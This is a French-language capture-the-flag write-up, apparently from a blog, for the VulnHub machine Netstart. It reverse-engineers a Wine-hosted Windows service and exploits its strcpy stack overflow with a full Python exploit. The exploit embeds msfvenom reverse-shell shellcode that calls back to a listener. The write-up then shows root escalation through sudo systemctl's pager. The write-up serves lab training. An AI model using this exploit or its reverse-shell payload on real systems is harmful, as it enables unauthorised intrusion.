# Solution du CTF Netstart de VulnHub

[Netstart](https://vulnhub.com/entry/netstart-1,614/) est un CTF créé par *foxlox*. La description donne la couleur :

> This is a Linux box, running a WINE Application vulnerable to Buffer Overflow

Et effectivement on rentre immédiatement dans le vif du sujet puisqu'on a un service inconnu et un partage FTP sur lequel on trouve l'exécutable Windows avec sa DLL :

```
Nmap scan report for 192.168.56.50
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           50992 Nov 16  2020 login.exe
|_-rw-r--r--    1 0        0           28613 Nov 16  2020 login_support.dll
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
2371/tcp open  worldwire?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    Password:
```

Comme d'habitude, quand il s'agit de reverse engineering, je me dirige automatiquement vers [Cutter](https://cutter.re/) parce que c'est gratuit et open-source. Que demander de mieux ?

Quand on n'ouvre l'exécutable dans Cutter on voit sur la gauche la liste des fonctions dans le binaire. Plusieurs ont un nom qui semble un bon début d'analyse :

* entry0

* entry1

* entry2

* main

* sym._WinMainCRTStartup

* sym.__main

* sym._main

C'est la fonction `WinMainCRTStartup` qui semble faire le lien entre tout ça et après avoir navigué un peu c'est `sym._main` qui correspond à notre vrai point d'entrée.

![Netstart login.exe main](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/netstart_main.png)

Ce que fait cette fonction c'est principalement de la gestion d'erreur. Ainsi à chaque bloc on est redirigé en cas d'erreur (flèches rouges) vers la fin d'exécution. Les vérifications sont faites sur la création de la socket, le bind, le listen, etc.

Si tout se passe bien on entre dans la dernière boucle qui est celle du `accept()` quand un client se connecte au port. La fonction `CreateThread` est alors appelée, cette dernière reçoit en paramètre le callback qui servira à la gestion du client : `sym._ConnectionHandler_4`.

![VulnHub Netstart login.exe ConnectionHandler](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/netstart_handler.png)

Cette fonction a deux points inétessants. D'abord juste avant le dernier bloc on voit un appel à une fonction baptisée `_f3` qui semble recevoir les données reçues sur la socket.

Ensuite on a toute une boucle de petites d'opérationsqui ressemblent à ceci :

```nasm
0x00401a49      mov edx, dword [var_bp_ch]
0x00401a4c      mov eax, dword [dest]
0x00401a4f      add eax, edx
0x00401a51      movzx eax, byte [eax]
0x00401a54      cmp al, 0x2d       ; 45
0x00401a56      jne 0x401a71
0x00401a58      mov eax, dword [var_bp_ch]
0x00401a5b      lea edx, [eax + 1]
0x00401a5e      mov eax, dword [dest]
0x00401a61      add eax, edx
0x00401a63      mov byte [eax], 0
0x00401a66      mov edx, dword [var_bp_ch]
0x00401a69      mov eax, dword [dest]
0x00401a6c      add eax, edx
0x00401a6e      mov byte [eax], 0xb0 ; 176
```

On voit ainsi plusieurs comparaisons à des valeurs harcodées : 0x2d, 0x2e, 0x46, 0x47, 0x59, 0x5e et 0x60 ainsi qu'en écrasement par un octet nul.

Il s'agit de caractères qui ne devront pas être inclus dans notre payload sans quoi il sera cassé.

La fonction `_f3` est quand à elle simple et il ne fait aucun doute qu'elle est vulnérable avec son appel à `strcpy` :

```nasm
_f3 (char *arg_8h);
; var char *dest @ ebp-0x6a2
; arg char *arg_8h @ ebp+0x8
; var const char *src @ esp+0x4
0x004018ce      push ebp
0x004018cf      mov ebp, esp
0x004018d1      sub esp, 0x6b8
0x004018d7      mov eax, dword [arg_8h]
0x004018da      mov dword [src], eax ; const char *src
0x004018de      lea eax, [dest]
0x004018e4      mov dword [esp], eax ; char *dest
0x004018e7      call _strcpy       ; sym._strcpy ; char *strcpy(char *dest, const char *src)
0x004018ec      nop
0x004018ed      leave
0x004018ee      ret
```

On peut lire en commentaire qu'il y a une variable locate (ici `dest`) qui prend 1698 octets (0x6a2) dans la stack frame. Il faut ensuite compter 4 octets pour écraser EBP puis 4 autres pour écraser EIP.

Pour valider ça on peut envoyer la chaine suivante en Python (suivi d'un CRLF sans quoi le serveur continue d'attendre un input) vers le binaire en écoute que l'on aura nous aussi lancé avec [Wine](https://www.winehq.org/) :

```python
b"A" * 1698 + b"BBBB" + b"CCCC" + b"DDDD" * 16
```

 Une fenêtre de débogage de Wine apparait aussitôt, on s'empresse de regarder les détails :

```
Unhandled exception: page fault on read access to 0x43434343 in 32-bit code (0x43434343).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:43434343 ESP:0135fb08 EBP:42424242 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:0135f45e EBX:00000040 ECX:0135f45e EDX:00000000
 ESI:00000000 EDI:00000000
Stack dump:
0x0135fb08:  44444444 44444444 44444444 44444444
0x0135fb18:  44444444 44444444 44444444 44444444
0x0135fb28:  44444444 44444444 44444444 44444444
0x0135fb38:  44444444 44444444 44444444 44444444
0x0135fb48:  00000a0d 00000000 00000000 00000000
0x0135fb58:  00000000 00000000 00000000 00000000
Backtrace:
=>0 0x43434343 (0x42424242)
0x43434343: -- no code accessible --
Modules:
Module	Address			Debug info	Name (8 modules)
PE	00400000-00413000	Deferred        login
PE	62500000-62510000	Deferred        login_support
PE	6a280000-6a31c000	Deferred        msvcrt
PE	6d780000-6d7a7000	Deferred        ws2_32
PE	70b40000-70c04000	Deferred        ucrtbase
PE	7b000000-7b288000	Deferred        kernelbase
PE	7b600000-7b65a000	Deferred        kernel32
PE	7bc00000-7bc9c000	Deferred        ntdll
```

Il y a plusieurs particularités qui vont en notre faveur :

* ESP pointe sur les données juste après l'adresse de retour que l'on va écraser

* EAX et ECX pointent tous les deux sur le début de notre buffer dans la stack

On peut le voir à l'aide de winedbg qui est une copie (mais pas aussi bien) de gdb :

```
Wine-dbg>b *0x004018ee
Breakpoint 1 at 0x000000004018ee login+0x18ee
Wine-dbg>c
Stopped on breakpoint 1 at 0x000000004018ee login+0x18ee
Wine-dbg>x/i $eip
0x000000004018ee login+0x18ee: ret
Wine-dbg>x/s $eax
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Ici j'ai mis un breakpoint sur l'instruction ret dans *_f3* puisque c'est là où le détournement de l'exécution aura lieu.

Il nous faut un shellcode et comme il y a différents caractères interdits autant s'en remettre à Metasploit qui utilisera des endodeurs pour obtenir un shellcode valide :

```shellsession
msfvenom -a x86 -b '\x2d\x2e\x46\x47\x59\x5e\x60\x00' -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 --format python
```

Il faut aussi choisir par quoi on écraser l'adresse de retour. A l'aide de [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) je trouve facilement une instruction dans le binaire qui fait un `call eax`. Il faut donc passer notre shellcode en début de payload :

```python
import socket

# msfvenom -a x86 -b '\x2d\x2e\x46\x47\x59\x5e\x60\x00' -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 --format python
shellcode =  b""
shellcode += b"\x33\xc9\xb1\x51\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
shellcode += b"\x13\xe8\xf7\xe4\xc1\x83\xeb\xfc\xe2\xf4\x14\x1f\x66"
shellcode += b"\xc1\xe8\xf7\x84\x48\x0d\xc6\x24\xa5\x63\xa7\xd4\x4a"
shellcode += b"\xba\xfb\x6f\x93\xfc\x7c\x96\xe9\xe7\x40\xae\xe7\xd9"
shellcode += b"\x08\x48\xfd\x89\x8b\xe6\xed\xc8\x36\x2b\xcc\xe9\x30"
shellcode += b"\x06\x33\xba\xa0\x6f\x93\xf8\x7c\xae\xfd\x63\xbb\xf5"
shellcode += b"\xb9\x0b\xbf\xe5\x10\xb9\x7c\xbd\xe1\xe9\x24\x6f\x88"
shellcode += b"\xf0\x14\xde\x88\x63\xc3\x6f\xc0\x3e\xc6\x1b\x6d\x29"
shellcode += b"\x38\xe9\xc0\x2f\xcf\x04\xb4\x1e\xf4\x99\x39\xd3\x8a"
shellcode += b"\xc0\xb4\x0c\xaf\x6f\x99\xcc\xf6\x37\xa7\x63\xfb\xaf"
shellcode += b"\x4a\xb0\xeb\xe5\x12\x63\xf3\x6f\xc0\x38\x7e\xa0\xe5"
shellcode += b"\xcc\xac\xbf\xa0\xb1\xad\xb5\x3e\x08\xa8\xbb\x9b\x63"
shellcode += b"\xe5\x0f\x4c\xb5\x9f\xd7\xf3\xe8\xf7\x8c\xb6\x9b\xc5"
shellcode += b"\xbb\x95\x80\xbb\x93\xe7\xef\x08\x31\x79\x78\xf6\xe4"
shellcode += b"\xc1\xc1\x33\xb0\x91\x80\xde\x64\xaa\xe8\x08\x31\x91"
shellcode += b"\xb8\xa7\xb4\x81\xb8\xb7\xb4\xa9\x02\xf8\x3b\x21\x17"
shellcode += b"\x22\x73\xab\xed\x9f\x24\x69\xd0\xf6\x8c\xc3\xe8\xe6"
shellcode += b"\xb8\x48\x0e\x9d\xf4\x97\xbf\x9f\x7d\x64\x9c\x96\x1b"
shellcode += b"\x14\x6d\x37\x90\xcd\x17\xb9\xec\xb4\x04\x9f\x14\x74"
shellcode += b"\x4a\xa1\x1b\x14\x80\x94\x89\xa5\xe8\x7e\x07\x96\xbf"
shellcode += b"\xa0\xd5\x37\x82\xe5\xbd\x97\x0a\x0a\x82\x06\xac\xd3"
shellcode += b"\xd8\xc0\xe9\x7a\xa0\xe5\xf8\x31\xe4\x85\xbc\xa7\xb2"
shellcode += b"\x97\xbe\xb1\xb2\x8f\xbe\xa1\xb7\x97\x80\x8e\x28\xfe"
shellcode += b"\x6e\x08\x31\x48\x08\xb9\xb2\x87\x17\xc7\x8c\xc9\x6f"
shellcode += b"\xea\x84\x3e\x3d\x4c\x14\x74\x4a\xa1\x8c\x67\x7d\x4a"
shellcode += b"\x79\x3e\x3d\xcb\xe2\xbd\xe2\x77\x1f\x21\x9d\xf2\x5f"
shellcode += b"\x86\xfb\x85\x8b\xab\xe8\xa4\x1b\x14"

# Utilise l'adresse d'une instruction déjà présente dans le binaire
# qui saute sur l'adresse contenue dans EAX
nop_call_eax = b"\x1f\x21\x40\x00"

buffer = shellcode + b"\x90" * (1702 - len(shellcode)) + nop_call_eax * 10
sock = socket.socket()
sock.connect(("127.0.0.1", 2371))
sock.recv(1024)
sock.send(buffer + b"\r\n")
sock.close()
```

Et là c'est la douche froide :

```
Unhandled exception: page fault on write access to 0xb80185f6 in 32-bit code (0x0135f563).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:0063 GS:006b
 EIP:0135f563 ESP:0135f960 EBP:0135f47b EFLAGS:00010202(  R- --  I   - - - )
 EAX:00005001 EBX:0135f5a6 ECX:0135f958 EDX:00000000
 ESI:0135f964 EDI:00000050
Stack dump:
0x0135f960:  f5806d63 5c110002 0138a8c0 00000005
0x0135f970:  02020202 536e6957 206b636f 00302e32
0x0135f980:  00000000 007321c0 00720000 00000000
0x0135f990:  7ffb2c00 007202b0 00000000 00723d24
0x0135f9a0:  007321c8 7ffb2c00 0135f9d0 00732101
0x0135f9b0:  00000000 00732078 00720000 00000000
Backtrace:
=>0 0x0135f563 (0x0135f47b)
0x0135f563: addb	%ah,0x35(%ecx,%edi,8)
```

On voit que le code tente d'écrire à `[ecx+edi*8]+0x35` (il me semble car ce n'est pas la notation que j'utilise habituellement :p) qui correspond à une zone mémoire non mappée.

Quel est le problème ? Potentiellement le shellcode place des données sur la stack et en le faisant se modifie lui-même ce qui provoque l'exécution de code cassé.

J'ai utilisé différents shellcodes et au final il y avait toujours un problème.

J'ai finalement placé le shellcode après l'adresse de retour avec l'utilisation d'un `jmp esp` comme gadget (présent dans la DLL) :

```python
jmp_esp = b"\xb8\x12\x50\x62"

buffer = b"a"*1702 + jmp_esp + b"\x90" * 8 + shellcode
sock = socket.socket()
sock.connect(("127.0.0.1", 2371))
sock.recv(1024)
sock.send(buffer + b"\r\n")
sock.close()
```

On place quelques NOPs histoire d'être sûr que notre shellcode est bien callé en mémoire.

Après un test local on peut appliquer sur la VM :

```shellsession
$ ncat -l -p 4444 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.50.
Ncat: Connection from 192.168.56.50:48510.
Microsoft Windows 6.1.7601 (4.0)

C:\users\fox>dir
Volume in drive C has no label.
Volume Serial Number is 0000-0000

Directory of C:\users\fox

 11/7/2022   7:33 PM  <DIR>         .
11/16/2020   5:58 PM  <DIR>         ..
11/16/2020   5:58 PM  <DIR>         AppData
11/16/2020   5:58 PM  <DIR>         Application Data
11/16/2020   5:58 PM  <DIR>         Contacts
11/16/2020   5:58 PM  <DIR>         Cookies
11/16/2020   5:58 PM  <DIR>         Desktop
11/16/2020   5:58 PM  <DIR>         Downloads
11/16/2020   5:58 PM  <DIR>         Favorites
11/16/2020   5:58 PM  <DIR>         Links
11/16/2020   5:58 PM  <DIR>         Local Settings
11/16/2020   5:58 PM  <DIR>         NetHood
11/16/2020   5:58 PM  <DIR>         PrintHood
11/16/2020   5:58 PM  <DIR>         Recent
11/16/2020   5:58 PM  <DIR>         Saved Games
11/16/2020   5:58 PM  <DIR>         Searches
11/16/2020   5:58 PM  <DIR>         SendTo
11/16/2020   5:58 PM  <DIR>         Start Menu
11/16/2020   5:58 PM  <DIR>         Temp
11/16/2020   5:58 PM  <DIR>         Templates
       0 files                        0 bytes
      20 directories      6,558,572,544 bytes free
```

Tout comme pour le CTF [CallMe](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20CallMe%20de%20VulnHub.md) j'ai utilisé la commande `start /unix` pour m'échapper de l'invite de commande Windows et obtenir un reverse shell avec `nc.traditional`.

Dans le dossier de l'utilisateur qui faisait tourner le service je trouve un script bash :

```shell
fox@netstart:/home/fox$ cat startup 
#!/bin/bash

xhost +si:localuser:fox
gsettings set org.gnome.desktop.session idle-delay 1
/usr/bin/wine login.exe
```

ainsi que le flag `75894c2b3d5c3b78372af63694cdc659`.

L'utilisateur peut utiliser `systemctl` avec les droits root, ce sera notre porte de sortie finale :

```shellsession
fox@netstart:/home/fox$ sudo -l
Matching Defaults entries for fox on netstart:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fox may run the following commands on netstart:
    (root) NOPASSWD: /usr/bin/systemctl
```

La plupart des commandes de listing de `systemctl` sont gérées par le pager `less` or il est possible d'obtenir un shell depuis en tapant `!sh` :

```shellsession
fox@netstart:/home/fox$ sudo /usr/bin/systemctl list-units
UNIT                                                                                     LOAD   ACTIVE SUB       DESCRIPTION                                                       
proc-sys-fs-binfmt_misc.automount                                                        loaded active waiting   Arbitrary Executable File Formats File System Automount Point     
sys-devices-pci0000:00-0000:00:01.1-ata2-host2-target2:0:0-2:0:0:0-block-sr0.device      loaded active plugged   VBOX_CD-ROM                                                       
sys-devices-pci0000:00-0000:00:03.0-net-enp0s3.device                                    loaded active plugged   82540EM Gigabit Ethernet Controller (PRO/1000 MT Desktop Adapter) 
sys-devices-pci0000:00-0000:00:05.0-sound-card0.device                                   loaded active plugged   82801AA AC'97 Audio Controller                                    
--- snip ---
systemd-modules-load.service                                                             loaded active exited    Load Kernel Modules                                               
systemd-random-seed.service                                                              loaded active exited    Load/Save Random Seed                                             
systemd-remount-fs.service                                                               loaded active exited    Remount Root and Kernel File Systems                              
!sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

Et du côté de root :

```shellsession
# cat win
while true
 do
  runuser -l fox -c 'cd ~/.wine/drive_c/users/fox && wine login.exe'
  sleep 3
 done
# cat proof.txt
f632f5eaffa5607c961e22ba40291ab7
```

J'ai bien galéré avec ces histoires de shellcode. Il aurait peut être été possible de faire fonctionner la première technique et faisant d'abord exécuter des gadgets pour décaler la stack (sub esp + ret).
